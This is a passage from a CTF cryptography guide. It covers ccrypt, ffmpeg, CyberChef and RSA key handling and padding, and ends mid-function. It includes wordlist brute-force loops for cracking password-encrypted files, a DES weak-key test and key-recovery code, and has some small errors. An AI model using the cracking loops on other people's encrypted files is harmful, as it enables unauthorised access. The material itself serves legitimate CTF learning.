`ccrypt` provides command-line symmetric encryption using AES (Rijndael-256) with integrated key derivation. Simpler than GPG for symmetric-only workflows, faster key recovery compared to full GPG operations.

#### Basic ccrypt Operations

**Encryption:**

```bash
# Encrypt file (prompts for password)
ccrypt plaintext.txt
# Creates plaintext.txt.cpt (ciphertext)

# Encrypt with password from command line
ccrypt -e -k "mypassword" plaintext.txt

# Encrypt with output file
ccrypt -e -k "mypassword" -o ciphertext.cpt plaintext.txt

# Encrypt all .txt files
ccrypt -e -k "mypassword" *.txt
```

**Decryption:**

```bash
# Decrypt (prompts for password)
ccrypt plaintext.txt.cpt
# Creates plaintext.txt (decrypted, removes .cpt)

# Decrypt with password from command line
ccrypt -d -k "mypassword" ciphertext.cpt

# Decrypt to stdout
ccrypt -d -k "mypassword" ciphertext.cpt | cat

# Decrypt multiple files
ccrypt -d -k "mypassword" *.cpt
```

**Key Information:**

```bash
# Show ccrypt version and cipher details
ccrypt -V

# Typical output shows: Rijndael-256 encryption, 256-bit key
```

#### CTF Brute Force with ccrypt

**Password Dictionary Attack:**

```bash
# Loop through wordlist
for password in $(cat /usr/share/wordlists/rockyou.txt | head -50000); do
    result=$(ccrypt -d -k "$password" ciphertext.cpt 2>&1)
    if [ $? -eq 0 ]; then
        echo "Password Found: $password"
        ccrypt -d -k "$password" -o decrypted.txt ciphertext.cpt
        break
    fi
done

# More efficient: check file type
for password in $(cat wordlist.txt); do
    ccrypt -d -k "$password" ciphertext.cpt -o temp.txt 2>/dev/null
    file_type=$(file temp.txt | grep -o "ASCII\|UTF-8\|ELF")
    if [ -n "$file_type" ]; then
        echo "Password: $password, File Type: $file_type"
        mv temp.txt decrypted.txt
        break
    fi
done
```

**Kali Linux: Prepare wordlist for rapid testing:**

```bash
# Use rockyou.txt or generate custom list
wc -l /usr/share/wordlists/rockyou.txt  # ~14M entries

# Create subset for faster testing
head -100000 /usr/share/wordlists/rockyou.txt > wordlist_subset.txt

# Parallel processing with GNU parallel
cat wordlist_subset.txt | parallel -j 4 "ccrypt -d -k {} ciphertext.cpt -o /tmp/test_{}.txt 2>/dev/null && echo {} && exit"
```

#### ccrypt vs openssl enc vs gpg

|Tool|Cipher|Key Size|Saline|Speed|CTF Use|
|---|---|---|---|---|---|
|**ccrypt**|Rijndael-256|256-bit|Built-in|Fast|Quick symmetric decryption|
|**openssl enc**|AES/DES/Blowfish|Variable|Optional|Fast|Multiple ciphers, flexible|
|**gpg**|AES/3DES|Variable|Optional|Slower|Asymmetric, signatures|

---

### ffmpeg (Encrypted Media)

`ffmpeg` processes audio/video files, including encrypted media recovery and metadata extraction. CTF challenges involving steganography in encrypted media or media file reconstruction often require ffmpeg.

#### Media Information and Metadata Extraction

**File Analysis:**

```bash
# Display detailed file information
ffmpeg -i media_file.mp4

# Output shows: codec, bitrate, resolution, duration, etc.
# Includes metadata fields that may contain hidden information

# Extract just codec information
ffmpeg -i media_file.mp4 2>&1 | grep "codec"

# List available streams
ffmpeg -i media_file.mp4 -f null - 2>&1 | grep -E "Stream|Duration"
```

**Metadata Extraction:**

```bash
# Extract all metadata
ffprobe -v quiet -print_format json -show_format -show_streams media_file.mp4

# Export metadata to file
ffprobe -print_format json -show_format media_file.mp4 > metadata.json

# Check for comments/title/description fields
ffprobe -show_entries format_tags media_file.mp4

# Extract specific metadata tag
ffprobe -show_entries format_tags=comment,title,artist media_file.mp4
```

#### Extracting Streams from Encrypted/Protected Media

**Audio Extraction:**

```bash
# Extract audio from video
ffmpeg -i video.mp4 -vn -acodec copy audio.mp3

# Extract audio and convert format
ffmpeg -i video.mp4 -vn -acodec libmp3lame -q:a 9 audio.mp3

# Extract specific audio stream (for multi-audio files)
ffmpeg -i video.mp4 -map 0:a:0 audio1.mp3
```

**Video Extraction:**

```bash
# Extract video stream without re-encoding
ffmpeg -i video.mp4 -vcodec copy -an output_no_audio.mp4

# Extract as raw frames (for steganography analysis)
ffmpeg -i video.mp4 frame_%04d.png

# Extract specific frame
ffmpeg -i video.mp4 -ss 00:00:05 -frames:v 1 frame.png
```

**Subtitle/Caption Extraction:**

```bash
# Extract embedded subtitles
ffmpeg -i video.mkv -map 0:s:0 subtitles.srt

# Convert subtitle format
ffmpeg -i subtitles.srt -c:s webvtt subtitles.vtt

# Extract all subtitle streams
ffmpeg -i video.mkv subtitles_%d.srt
```

#### Analyzing Encrypted Media Structure

**Container and Codec Analysis:**

```bash
# Show all streams with full detail
ffprobe -show_entries stream=codec_type,codec_name,width,height,r_frame_rate video.mp4

# Detect encryption/protection
ffprobe -show_entries stream=codec_profile,pix_fmt video.mp4

# Check for DRM or unusual codec parameters
ffmpeg -i protected_video.mp4 2>&1 | grep -i "protection\|encrypted\|drm"
```

**Frame-by-Frame Analysis (Steganography Detection):**

```bash
# Extract all frames for steganography analysis
ffmpeg -i video.mp4 -vf fps=1 frame_%04d.png

# Check for hidden data in frame metadata
for frame in frame_*.png; do
    identify -verbose "$frame" | grep -i "comment\|meta"
done

# Analyze frame histograms for anomalies
convert frame_0001.png -format %c histogram:info: | head -20
```

#### CTF-Specific ffmpeg Workflows

**Recovering Corrupted/Incomplete Media:**

```bash
# Attempt to remux corrupted container
ffmpeg -i corrupted.mp4 -c copy -bsf:a aac_adtstoasc recovered.mp4

# Rebuild from raw streams (if codec known)
ffmpeg -f rawvideo -pix_fmt yuv420p -s 1920x1080 -r 30 -i raw_video.yuv -f pcm_s16le -ac 2 -ar 44100 -i raw_audio.pcm output.mp4
```

**Extracting Hidden Data from Media:**

```bash
# Extract binary data appended to media file
tail -c +$(ffprobe -show_entries format=size media_file.mp4 | grep "size" | cut -d= -f2) media_file.mp4 > appended_data.bin

# Check file size discrepancy
ffprobe -show_entries format=size media_file.mp4
ls -lah media_file.mp4  # Compare actual vs. reported size

# Extract if actual > reported
extracted_bytes=$(($(stat -f%z media_file.mp4) - $(ffprobe -show_entries format=size media_file.mp4 | grep "size=" | cut -d= -f2)))
if [ $extracted_bytes -gt 0 ]; then
    tail -c $extracted_bytes media_file.mp4 > hidden.bin
fi
```

**Audio Steganography Analysis:**

```bash
# Convert audio to spectrogram (visual analysis)
ffmpeg -i audio.mp3 -lavfi showspectrumpic=s=1920x1080:log=1 spectrogram.png

# Extract Fourier analysis data
ffmpeg -i audio.mp3 -lavfi "astats=metadata=1:reset=1" -f null -

# Check for LSB steganography markers
sox audio.mp3 -t raw -r 44100 -e signed -b 16 -c 2 - | od -An -t x1 | head -100
```

**Metadata Manipulation for Decryption Clues:**

```bash
# Extract and search metadata for decryption keys/passwords
ffprobe -show_entries format_tags media_file.mp4 | grep -iE "key|password|cipher|flag"

# Export as XML for detailed analysis
ffprobe -print_format xml -show_format media_file.mp4 > metadata.xml

# Search extracted metadata
grep -i "comment\|description\|artist\|title\|album" metadata.xml
```

---

### CyberChef

CyberChef (https://gchq.github.io/CyberChef/) provides web-based encoding/decoding, cryptographic operations, and data transformation without installation. Ideal for rapid CTF problem-solving across multiple cipher types and encoding formats.

#### Core CyberChef Features

**Recipe Builder Interface:**

```
Left Panel: Operation Search
- Search by cipher name (AES, DES, ROT13, etc.)
- Drag operations into recipe
- Configure parameters (key, IV, mode, padding)

Center: Input Data
- Paste plaintext/ciphertext
- Support for hex, base64, raw text

Right: Output Data
- Real-time recipe results
- Selectable output formats
```

#### Common Cipher Recipes

**AES Decryption (CBC Mode):**

```
Operations:
1. From Hex (if ciphertext is hex-encoded)
2. AES Decrypt
   - Key: [paste hex key]
   - IV: [paste hex IV]
   - Mode: CBC
   - Input format: Hex
   - Output format: UTF8

Result: Decrypted plaintext
```

**DES Decryption:**

```
Operations:
1. From Hex
2. DES Decrypt
   - Key: [8-byte hex]
   - IV: [8-byte hex, if CBC mode]
   - Mode: ECB or CBC
```

**Brute Force Caesar Cipher:**

```
Operations:
1. ROT13 (tests all 26 shifts)
   - Shows all possible outputs
   - Look for readable plaintext

Or manual ROT with varying amounts:
1. Rot13 (shift by N) - set N from 0-25
```

**Vigenère Cipher Decryption:**

```
Operations:
1. Vigenère Decode
   - Key: [paste known key or test dictionary words]
   - Result: Decoded plaintext

If key unknown:
1. Vigenère Brute Force
   - CyberChef tests common key lengths
   - Shows all possible plaintexts
```

**Substitution Cipher Analysis:**

```
Operations:
1. Frequency Analysis
   - Shows letter frequency distribution
   - Compares to English baseline
   - Suggests probable plaintext character mappings

2. Analyze Hash
   - Identify hash type (MD5, SHA-1, SHA-256)
   - Compare to known hash databases
```

#### Encoding/Decoding Chains

**Base64 → AES Decrypt → UTF-8:**

```
Operations (in order):
1. From Base64
2. AES Decrypt [key=..., IV=...]
3. From Hex (if needed)
4. To UTF-8 (implicit)

Example: b64_data → hex_ciphertext → plaintext
```

**Hex → ROT13 → ASCII:**

```
Operations:
1. From Hex
2. ROT13
3. To ASCII (implicit display)
```

**Multiple Encoding Layers:**

```
Operations for: Base64(Gzip(AES(plaintext)))
1. From Base64
2. Gunzip
3. AES Decrypt
4. Display as UTF-8

CyberChef shows each intermediate step.
```

#### CTF Workflow with CyberChef

**Unknown Cipher Type Identification:**

```
1. Paste ciphertext
2. Try: Frequency Analysis
   - If English-like frequencies: Substitution cipher
   - If uniform: Likely block cipher

3. For substitution: Try Vigenère Brute Force
4. For block cipher: Try AES/DES/3DES with test keys
5. For simple encoding: Try ROT13, Base64, Hex
```

**Hash Cracking Workflow:**

```
1. Identify hash type: Analyze Hash operation
2. If hash identified (e.g., MD5):
   - Use Magic operation (auto-detection)
   - Or try online rainbow tables (external)

3. If plaintext from CTF context likely:
   - Try common CTF passwords
   - Example: "flag", "ctf", "password123"
```

**Complex Transformation Chains:**

```
Example CTF challenge: 
Input: "aGVsbG8gd29ybGQgZmxhZ3t0ZXN0fQ=="

Recipe:
1. From Base64 → "hello world flag{test}"
2. ROT13 → reveals pattern if ROT applied
3. Display: Result with highlighting

CyberChef shows all intermediate results for debugging.
```

#### Advanced CyberChef Features

**Save Recipes:**

```
- Click "Save Recipe" button
- Name: "CTF_AES_CBC_Decrypt"
- Reload recipe for future use
- Share recipe link with team
```

**Magic Operation (Auto-Detection):**

```
Single Operation: Magic
- Attempts common encoding/cipher operations
- Returns most likely interpretation
- Useful for unknown cipher identification

Ideal for: Quick triage of unfamiliar data
```

**Regex/Search Operations:**

```
Operations:
1. Find/Replace (regex support)
2. Split on delimiter
3. Extract/Filter specific patterns

Use case: Extract keys/IVs from mixed content
```

**Input/Output Format Flexibility:**

```
Input formats:
- UTF-8 text
- Hex string
- Base64
- Raw binary (hex display)

Output formats:
- UTF-8 text
- Hex
- Base64
- HTML entities
- Decimal/Binary representation

Automatic conversion between formats.
```

---

### Practical CTF Cryptanalysis Workflow

**Step 1: Rapid Tool Selection**

- **Quick encoding check:** CyberChef (base64, hex, ROT13)
- **Password-protected file:** `openssl enc` or `ccrypt` with dictionary attack
- **GPG-encrypted:** `gpg` with key recovery or `john` for passphrase
- **Media-embedded data:** `ffmpeg` for extraction + steganography analysis
- **Unknown cipher:** CrypTool Online frequency analysis
- **Block cipher experimentation:** `openssl enc` with multiple ciphers/modes
- **CrypTool:** Visual cipher analysis and transposition cipher testing

**Step 2: Vulnerability Identification**

```
Check ECB mode weakness:
openssl enc -aes-128-ecb -K [key] -in ciphertext.bin | xxd | grep -c "^[a-f0-9]*: [0-9a-f]"
(Repeated patterns indicate identical plaintext blocks)

Test for weak keys (DES):
for key in 0101010101010101 fefefefefefefefe; do
    openssl enc -d -des-ecb -K $key -in ciphertext.bin 2>/dev/null | file -
done

Known plaintext brute force:
for pass in $(cat wordlist.txt); do
    if openssl enc -aes-256-cbc -d -K $(echo -n $pass | md5sum | cut -d' ' -f1) -in ct.bin | grep -q "flag"; then
        echo "Pass: $pass"
    fi
done
```

**Step 3: Decryption Verification**

```
Valid plaintext indicators:
- Contains expected flag format (flag{...}, ctf{...})
- Passes file type detection
- High English text probability (frequency analysis)
- No binary garbage (unless expected)

Automated check:
decrypted=$(openssl enc -d ...)
if echo "$decrypted" | file - | grep -qE "ASCII|UTF-8"; then
    echo "Likely valid plaintext"
    echo "$decrypted"
fi
```

---

# ASYMMETRIC CRYPTOGRAPHY

## RSA (Rivest-Shamir-Adleman)

### Key Generation

#### Mathematical Foundation

**RSA Key Generation Algorithm**

```
Step 1: Select two large prime numbers
    p, q (typically 1024-2048 bits each)

Step 2: Calculate modulus
    n = p × q

Step 3: Calculate Euler's totient
    φ(n) = (p - 1) × (q - 1)

Step 4: Choose public exponent e
    Requirements:
    - 1 < e < φ(n)
    - gcd(e, φ(n)) = 1 (e and φ(n) are coprime)
    - Common values: 3, 17, 65537 (0x10001)

Step 5: Calculate private exponent d
    d ≡ e^(-1) (mod φ(n))
    d × e ≡ 1 (mod φ(n))

Public Key:  (n, e)
Private Key: (n, d)
Also store:  (p, q, φ(n)) for efficiency
```

**Example with Small Numbers**

```python
# Educational example (NOT secure - primes too small)

# Step 1: Choose primes
p = 61
q = 53

# Step 2: Calculate n
n = p * q  # = 3233

# Step 3: Calculate φ(n)
phi_n = (p - 1) * (q - 1)  # = 60 × 52 = 3120

# Step 4: Choose e (common: 65537, but using 17 for example)
e = 17

# Verify gcd(e, φ(n)) = 1
from math import gcd
assert gcd(e, phi_n) == 1  # True

# Step 5: Calculate d using extended Euclidean algorithm
def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd_val, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd_val, x, y

def mod_inverse(e, phi):
    gcd_val, x, y = extended_gcd(e, phi)
    if gcd_val != 1:
        raise ValueError("Modular inverse does not exist")
    return (x % phi + phi) % phi

d = mod_inverse(e, phi_n)  # = 2753

# Verify: (d × e) mod φ(n) = 1
assert (d * e) % phi_n == 1  # True

print(f"Public Key: (n={n}, e={e})")
print(f"Private Key: (n={n}, d={d})")
print(f"Secret primes: p={p}, q={q}")
```

#### Practical Key Generation with Python

**Using PyCryptodome**

```python
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Generate 2048-bit RSA key pair
key = RSA.generate(2048)

# Extract components
n = key.n  # Modulus
e = key.e  # Public exponent (usually 65537)
d = key.d  # Private exponent
p = key.p  # First prime
q = key.q  # Second prime

print(f"Modulus (n): {n}")
print(f"Public exponent (e): {e}")
print(f"Private exponent (d): {d}")
print(f"Prime p: {p}")
print(f"Prime q: {q}")

# Verify: n = p × q
assert n == p * q

# Verify: φ(n) = (p-1) × (q-1)
phi_n = (p - 1) * (q - 1)

# Verify: d × e ≡ 1 (mod φ(n))
assert (d * e) % phi_n == 1

# Export keys
private_pem = key.export_key()
public_pem = key.publickey().export_key()

# Save to files
with open('private_key.pem', 'wb') as f:
    f.write(private_pem)

with open('public_key.pem', 'wb') as f:
    f.write(public_pem)

print("\nKeys saved to private_key.pem and public_key.pem")
```

**Using `cryptography` Library**

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Generate key
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

# Get public key
public_key = private_key.public_key()

# Extract numbers
private_numbers = private_key.private_numbers()
public_numbers = private_key.public_key().public_numbers()

print(f"n: {public_numbers.n}")
print(f"e: {public_numbers.e}")
print(f"d: {private_numbers.d}")
print(f"p: {private_numbers.p}")
print(f"q: {private_numbers.q}")

# Serialize to PEM format
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

print("\nPrivate Key PEM:")
print(private_pem.decode())
print("\nPublic Key PEM:")
print(public_pem.decode())
```

#### OpenSSL Key Generation

```bash
# Generate 2048-bit RSA private key
openssl genrsa -out private_key.pem 2048

# Extract public key from private key
openssl rsa -in private_key.pem -pubout -out public_key.pem

# View private key components
openssl rsa -in private_key.pem -text -noout

# Output shows:
# - modulus (n)
# - publicExponent (e)
# - privateExponent (d)
# - prime1 (p)
# - prime2 (q)
# - exponent1 (d mod (p-1))
# - exponent2 (d mod (q-1))
# - coefficient (q^-1 mod p)

# Generate key with specific public exponent
openssl genrsa -3 -out private_key_e3.pem 2048  # e=3
openssl genrsa -out private_key_e65537.pem 2048  # e=65537 (default)

# View public key
openssl rsa -pubin -in public_key.pem -text -noout

# Convert formats
# PEM to DER
openssl rsa -in private_key.pem -outform DER -out private_key.der

# DER to PEM
openssl rsa -in private_key.der -inform DER -out private_key.pem

# Extract modulus and exponent as hex
openssl rsa -pubin -in public_key.pem -modulus -noout
openssl rsa -pubin -in public_key.pem -text -noout | grep Exponent
```

#### Key Size and Security

**Recommended Key Sizes**

```
Key Size | Security Level | Status
---------|----------------|------------------
1024-bit | ~80 bits       | Deprecated (breakable)
2048-bit | ~112 bits      | Minimum for current use
3072-bit | ~128 bits      | Recommended
4096-bit | ~140 bits      | High security
8192-bit | ~190 bits      | Overkill (very slow)

Rule of thumb (as of 2025):
- 2048-bit: General use, TLS certificates
- 3072-bit: Long-term security (10+ years)
- 4096-bit: High-value targets, government use
```

**Key Size Impact**

```python
import time
from Crypto.PublicKey import RSA

def benchmark_key_generation(key_size):
    """Measure key generation time"""
    start = time.time()
    key = RSA.generate(key_size)
    elapsed = time.time() - start
    
    print(f"{key_size}-bit key generation: {elapsed:.3f} seconds")
    return key

# Compare different key sizes
for size in [1024, 2048, 3072, 4096]:
    benchmark_key_generation(size)

# Typical output:
# 1024-bit key generation: 0.023 seconds
# 2048-bit key generation: 0.156 seconds
# 3072-bit key generation: 0.587 seconds
# 4096-bit key generation: 2.341 seconds
```

#### Chinese Remainder Theorem (CRT) Parameters

**CRT Optimization**

```python
"""
CRT speeds up private key operations by ~4x

Instead of computing: m = c^d mod n
Compute:
    m_p = c^(d mod (p-1)) mod p
    m_q = c^(d mod (q-1)) mod q
    m = CRT(m_p, m_q)

Additional parameters stored:
    dP = d mod (p-1)
    dQ = d mod (q-1)
    qInv = q^(-1) mod p
"""

def calculate_crt_parameters(p, q, d):
    """Calculate CRT parameters for faster decryption"""
    dP = d % (p - 1)  # exponent1
    dQ = d % (q - 1)  # exponent2
    qInv = mod_inverse(q, p)  # coefficient
    
    return dP, dQ, qInv

def crt_rsa_decrypt(c, p, q, dP, dQ, qInv):
    """Fast RSA decryption using CRT"""
    # Compute m_p and m_q
    m_p = pow(c, dP, p)
    m_q = pow(c, dQ, q)
    
    # Combine using CRT
    h = (qInv * (m_p - m_q)) % p
    m = m_q + h * q
    
    return m

# Example
p = 61
q = 53
n = p * q  # 3233
e = 17
d = 2753

dP, dQ, qInv = calculate_crt_parameters(p, q, d)

print(f"CRT parameters:")
print(f"dP (exponent1): {dP}")
print(f"dQ (exponent2): {dQ}")
print(f"qInv (coefficient): {qInv}")

# Test encryption/decryption
m = 123
c = pow(m, e, n)

# Standard decryption
m_standard = pow(c, d, n)

# CRT decryption
m_crt = crt_rsa_decrypt(c, p, q, dP, dQ, qInv)

assert m_standard == m_crt == m
print(f"\nOriginal: {m}")
print(f"Ciphertext: {c}")
print(f"Decrypted (standard): {m_standard}")
print(f"Decrypted (CRT): {m_crt}")
```

---

### Public/Private Key Pairs

#### Key Format Standards

**PEM (Privacy-Enhanced Mail) Format**

```
-----BEGIN RSA PRIVATE KEY-----
Base64-encoded DER data
-----END RSA PRIVATE KEY-----

-----BEGIN PUBLIC KEY-----
Base64-encoded DER data
-----END PUBLIC KEY-----

Variants:
- PKCS#1: RSA-specific format
  BEGIN RSA PRIVATE KEY / BEGIN RSA PUBLIC KEY
  
- PKCS#8: General private key format
  BEGIN PRIVATE KEY / BEGIN ENCRYPTED PRIVATE KEY
  
- X.509: Public key format
  BEGIN PUBLIC KEY
```

**Parsing PEM Keys**

```python
from Crypto.PublicKey import RSA

# Load private key
with open('private_key.pem', 'r') as f:
    private_key = RSA.import_key(f.read())

# Load public key
with open('public_key.pem', 'r') as f:
    public_key = RSA.import_key(f.read())

# Alternative: Load from string
private_pem = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----"""

key = RSA.import_key(private_pem)

# Extract components
print(f"Has private key: {key.has_private()}")
print(f"Key size: {key.size_in_bits()} bits")
print(f"Modulus (n): {key.n}")
print(f"Public exponent (e): {key.e}")

if key.has_private():
    print(f"Private exponent (d): {key.d}")
    print(f"Prime p: {key.p}")
    print(f"Prime q: {key.q}")
```

**Using OpenSSL for Parsing**

```bash
# Extract modulus (n) in hex
openssl rsa -pubin -in public_key.pem -modulus -noout
# Output: Modulus=C9F3A...

# Extract modulus in decimal
openssl rsa -pubin -in public_key.pem -text -noout | grep -A 20 "Modulus"

# Extract public exponent
openssl rsa -pubin -in public_key.pem -text -noout | grep Exponent
# Output: Exponent: 65537 (0x10001)

# Convert public key to single-line format (for CTF)
openssl rsa -pubin -in public_key.pem -RSAPublicKey_out | \
  grep -v "BEGIN\|END" | tr -d '\n'
```

#### Key Component Extraction for CTF

**Python Script for Key Analysis**

```python
from Crypto.PublicKey import RSA
import sys

def analyze_rsa_key(filename):
    """Extract all RSA key components"""
    with open(filename, 'rb') as f:
        key = RSA.import_key(f.read())
    
    print("=" * 60)
    print(f"RSA Key Analysis: {filename}")
    print("=" * 60)
    
    # Public components (always available)
    print(f"\n[Public Key]")
    print(f"Modulus (n):")
    print(f"  Decimal: {key.n}")
    print(f"  Hex: {hex(key.n)}")
    print(f"  Bits: {key.n.bit_length()}")
    print(f"\nPublic Exponent (e): {key.e} (0x{key.e:x})")
    
    # Private components (if available)
    if key.has_private():
        print(f"\n[Private Key]")
        print(f"Private Exponent (d):")
        print(f"  Decimal: {key.d}")
        print(f"  Hex: {hex(key.d)}")
        
        print(f"\nPrime p:")
        print(f"  Decimal: {key.p}")
        print(f"  Hex: {hex(key.p)}")
        print(f"  Bits: {key.p.bit_length()}")
        
        print(f"\nPrime q:")
        print(f"  Decimal: {key.q}")
        print(f"  Hex: {hex(key.q)}")
        print(f"  Bits: {key.q.bit_length()}")
        
        # Verify relationships
        phi_n = (key.p - 1) * (key.q - 1)
        print(f"\n[Verification]")
        print(f"n = p × q: {key.n == key.p * key.q}")
        print(f"φ(n) = (p-1) × (q-1): {phi_n}")
        print(f"e × d ≡ 1 (mod φ(n)): {(key.e * key.d) % phi_n == 1}")
        
        # CRT parameters
        dP = key.d % (key.p - 1)
        dQ = key.d % (key.q - 1)
        qInv = pow(key.q, -1, key.p)
        
        print(f"\n[CRT Parameters]")
        print(f"dP (d mod (p-1)): {dP}")
        print(f"dQ (d mod (q-1)): {dQ}")
        print(f"qInv (q^-1 mod p): {qInv}")
    
    print("\n" + "=" * 60)

# Usage
if len(sys.argv) > 1:
    analyze_rsa_key(sys.argv[1])
else:
    print("Usage: python analyze_key.py <key_file.pem>")
```

**Quick Key Component Extractor**

```python
def extract_n_e_from_pem(public_key_file):
    """Quick extraction of n and e for CTF"""
    from Crypto.PublicKey import RSA
    
    with open(public_key_file, 'r') as f:
        key = RSA.import_key(f.read())
    
    return key.n, key.e

# Usage
n, e = extract_n_e_from_pem('public_key.pem')
print(f"n = {n}")
print(f"e = {e}")

# For online tools (factordb, etc.)
print(f"\nn (hex): {hex(n)}")
print(f"n (decimal): {n}")
```

#### Public Key Derivation

**Derive Public Key from Private Key**

```python
from Crypto.PublicKey import RSA

# Load private key
private_key = RSA.import_key(open('private_key.pem').read())

# Extract public key
public_key = private_key.publickey()

# Export public key
public_pem = public_key.export_key()

with open('derived_public_key.pem', 'wb') as f:
    f.write(public_pem)

print("Public key derived from private key")
```

```bash
# Using OpenSSL
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Verify they match
openssl rsa -in private_key.pem -noout -modulus
openssl rsa -pubin -in public_key.pem -noout -modulus
# Both should output same modulus
```

#### Key Reconstruction from Components

**Rebuild Private Key from n, e, p, q**

```python
from Crypto.PublicKey import RSA

def reconstruct_private_key(n, e, p, q):
    """
    Reconstruct RSA private key from known components
    Useful when you've factored n or recovered primes
    """
    # Calculate d
    phi_n = (p - 1) * (q - 1)
    d = pow(e, -1, phi_n)
    
    # Create RSA key object
    key = RSA.construct((n, e, d, p, q))
    
    return key

# Example: Reconstructing from factorization
n = 3233
e = 17
p = 61  # Factored from n
q = 53  # Factored from n

private_key = reconstruct_private_key(n, e, p, q)

# Export reconstructed key
print(private_key.export_key().decode())

# Verify it works
plaintext = 123
ciphertext = pow(plaintext, e, n)
decrypted = pow(ciphertext, private_key.d, n)

assert plaintext == decrypted
print(f"\nVerification successful: {plaintext} → {ciphertext} → {decrypted}")
```

**Rebuild from n, e, d (when p, q unknown)**

```python
def reconstruct_from_ned(n, e, d):
    """
    [Inference] Reconstruct p and q from n, e, d
    Uses Fermat's factorization or probabilistic method
    """
    import random
    
    # Calculate k = de - 1
    k = d * e - 1
    
    # Factor k = 2^t × r where r is odd
    t = 0
    r = k
    while r % 2 == 0:
        t += 1
        r //= 2
    
    # Try random values to find factor
    for _ in range(100):
        g = random.randint(2, n - 1)
        y = pow(g, r, n)
        
        if y == 1 or y == n - 1:
            continue
        
        for _ in range(t - 1):
            x = pow(y, 2, n)
            
            if x == 1:
                # Found factor
                p = gcd(y - 1, n)
                if p > 1 and p < n:
                    q = n // p
                    return RSA.construct((n, e, d, p, q))
            
            if x == n - 1:
                break
            
            y = x
    
    raise ValueError("Could not factor n from given parameters")

from math import gcd

# Example
n = 3233
e = 17
d = 2753

try:
    key = reconstruct_from_ned(n, e, d)
    print(f"Recovered p: {key.p}")
    print(f"Recovered q: {key.q}")
except ValueError as err:
    print(f"Error: {err}")
```

---

### Encryption & Decryption

#### Textbook RSA (Unpadded)

**Basic Mathematical Operations**

```python
def rsa_encrypt(plaintext, e, n):
    """
    Textbook RSA encryption (INSECURE - no padding)
    C = M^e mod n
    """
    # Convert message to integer
    if isinstance(plaintext, bytes):
        m = int.from_bytes(plaintext, 'big')
    elif isinstance(plaintext, int):
        m = plaintext
    else:
        m = int.from_bytes(plaintext.encode(), 'big')
    
    # Ensure message < n
    if m >= n:
        raise ValueError("Message too large for modulus")
    
    # Encrypt
    c = pow(m, e, n)
    return c

def rsa_decrypt(ciphertext, d, n):
    """
    Textbook RSA decryption
    M = C^d mod n
    """
    m = pow(ciphertext, d, n)
    return m

# Example with small numbers
n = 3233
e = 17
d = 2753

# Encrypt
message = 65  # ASCII 'A'
ciphertext = rsa_encrypt(message, e, n)
print(f"Plaintext: {message}")
print(f"Ciphertext: {ciphertext}")

# Decrypt
decrypted = rsa_decrypt(ciphertext, d, n)
print(f"Decrypted: {decrypted}")

assert message == decrypted
```

**Why Textbook RSA is Insecure**

```python
"""
[Inference] Textbook RSA vulnerabilities:

1. Deterministic: Same plaintext always produces same ciphertext
2. Multiplicative: E(m1) × E(m2) = E(m1 × m2)
3. No integrity: Attacker can modify ciphertext predictably
4. Small message vulnerability: Low-value messages can be brute-forced
5. Related message attacks: If same message sent to multiple recipients
"""

# Example: Deterministic vulnerability
m1 = 42
c1 = rsa_encrypt(m1, e, n)
c2 = rsa_encrypt(m1, e, n)

print(f"Same message encrypted twice:")
print(f"c1 = {c1}")
print(f"c2 = {c2}")
print(f"Identical: {c1 == c2}")  # Always True - leaks information!

# Example: Multiplicative property
m1 = 5
m2 = 7
c1 = rsa_encrypt(m1, e, n)
c2 = rsa_encrypt(m2, e, n)

# Attacker can compute encryption of m1 × m2 without key
c_product = (c1 * c2) % n
m_product = rsa_decrypt(c_product, d, n)

print(f"\nMultiplicative property:")
print(f"E({m1}) × E({m2}) = E({m1 × m2})")
print(f"Decrypted product: {m_product}")
print(f"Expected: {(m1 * m2) % n}")
assert m_product == (m1 * m2) % n
```

#### PKCS#1 v1.5 Padding

**Padding Format**

```
PKCS#1 v1.5 Format:
0x00 || 0x02 || PS || 0x00 || M

Components:
- 0x00: Leading byte
- 0x02: Block type (0x02 for encryption, 0x01 for signing)
- PS: Padding string (random non-zero bytes, minimum 8 bytes)
- 0x00: Separator
- M: Actual message

Minimum padded length = key_size_in_bytes
Example for 2048-bit (256-byte) key:
- Leading: 1 byte (0x00)
- Type: 1 byte (0x02)
- PS: 256 - 3 - len(M) bytes (minimum 8)
- Separator: 1 byte (0x00)
- Message: len(M) bytes
```

**Implementation**

```python
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Generate key
key = RSA.generate(2048)

# Create cipher object
cipher_encrypt = PKCS1_v1_5.new(key.publickey())
cipher_decrypt = PKCS1_v1_5.new(key)

# Encrypt
plaintext = b"Secret message"
ciphertext = cipher_encrypt.encrypt(plaintext)

print(f"Plaintext: {plaintext}")
print(f"Ciphertext length: {len(ciphertext)} bytes")
print(f"Ciphertext (hex): {ciphertext.hex()}")

# Decrypt
sentinel = b"DECRYPTION_FAILED"  # Sentinel value for failed decryption
decrypted = cipher_decrypt.decrypt(ciphertext, sentinel)

if decrypted == sentinel:
    print("Decryption failed!")
else:
    print(f"Decrypted: {decrypted}")
    assert decrypted == plaintext
```

**Manual PKCS#1 v1.5 Padding**

```python
import os

def pkcs1_v15_pad(message, key_size_bytes):
    """
    Apply PKCS#1 v1.5 padding manually
    """
    message_length = len(message)
    
    # Calculate padding length
    padding_length = key_size_bytes - 3 - message_length
    
    if padding_length < 8:
        raise ValueError("Message too long for key size")
    
    # Generate random non-zero padding
    padding = bytearray()
    while len(padding) < padding_length:
        byte = os.urandom(1)[0]
        if byte != 0:  # Must be non-zero
            padding.append(byte)
    
    # Construct padded message
    padded = bytes([0x00, 0x02]) + bytes(padding) + bytes([0x00]) + message
    
    return padded

def pkcs1_v15_unpad(padded_message):
    """
